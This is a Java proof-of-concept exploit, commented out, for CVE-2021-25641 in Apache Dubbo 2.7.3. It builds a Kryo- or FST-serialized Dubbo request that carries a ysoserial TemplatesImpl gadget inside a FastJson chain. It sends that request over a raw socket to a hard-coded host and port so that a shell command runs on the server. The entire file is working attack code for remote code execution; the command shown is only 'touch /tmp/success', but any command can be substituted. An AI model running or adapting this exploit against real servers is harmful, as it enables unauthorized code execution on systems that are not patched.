//package dubbo.cve;
//
//
//import com.alibaba.fastjson.JSONObject;
//import com.sun.org.apache.xpath.internal.objects.XString;
//import org.apache.dubbo.common.io.Bytes;
//import org.apache.dubbo.common.serialize.ObjectOutput;
//import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
//import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
//import org.springframework.aop.target.HotSwappableTargetSource;
//import ysoserial.payloads.util.Gadgets;
//
//import java.io.ByteArrayOutputStream;
//import java.io.OutputStream;
//import java.net.Socket;
//import java.util.Random;
//
///**
// * 测试版本: dubbo 2.7.3
// * 修复版本: dubbo 2.7.9
// *
// */
//public class CVE_2021_25641 {
//
//    public static String SerType = "KyroSerialization";
//    static String dubbo_ip = "10.58.120.200";
//    static int dubbo_port = 20880;
//    static String cmd = "touch /tmp/success";
//
//    public static Object makeXStringToStringTrigger(Object jsonObject) throws Exception {
//        XString xString = new XString("HEYO");
//        return Gadgets.makeMap(new HotSwappableTargetSource(jsonObject), new HotSwappableTargetSource(xString));
//    }
//
//    public static Object getGadgetsObj(String cmd) throws Exception{
//        //Make TemplatesImpl
//        Object templates = Gadgets.createTemplatesImpl(cmd);
//        //Make FastJson Gadgets Chain
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.put("oops",templates);
//        return makeXStringToStringTrigger(jsonObject);
//    }
//
//    public static void main(String[] args) throws Exception {
//
//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
//
//        //Make header
//        byte[] header = new byte[16];
//        ObjectOutput body;
//        // set magic number.
//        Bytes.short2bytes((short) 0xdabb, header);
//        // set request and serialization flag.
//
//        switch (SerType) {
//            case "FstSerialization":
//                body = new FstObjectOutput(baos);
//                header[2] = (byte) ((byte) 0x80 | (byte)9 | (byte) 0x40);
//                break;
//            case "KyroSerialization":
//            default:
//                body = new KryoObjectOutput(baos);
//                header[2] = (byte) ((byte) 0x80 | (byte)8 | (byte) 0x40);
//                break;
//        }
//        // set request id.
//        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
//        //Genaral ObjectOutput
//        body.writeUTF("2.7.8");
//        body.writeUTF("any_path");
//        body.writeUTF("");
//        body.writeUTF("any_method");
//        body.writeUTF("Ljava/lang/Class;");//任意类描述符
//
//        body.writeObject(getGadgetsObj(cmd));
//        body.writeObject(null);
//        body.flushBuffer();
//
//        //Transform ObjectOutput to bytes payload
//        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
//        Bytes.int2bytes(baos.size(), header, 12);
//        totalBaos.write(header);
//        totalBaos.write(baos.toByteArray());
//
//        byte[] bytes = totalBaos.toByteArray();
//
//        //Send Payload
//        Socket socket = new Socket(dubbo_ip, dubbo_port);
//        OutputStream outputStream = socket.getOutputStream();
//        outputStream.write(bytes);
//        outputStream.flush();
//        outputStream.close();
//    }
//}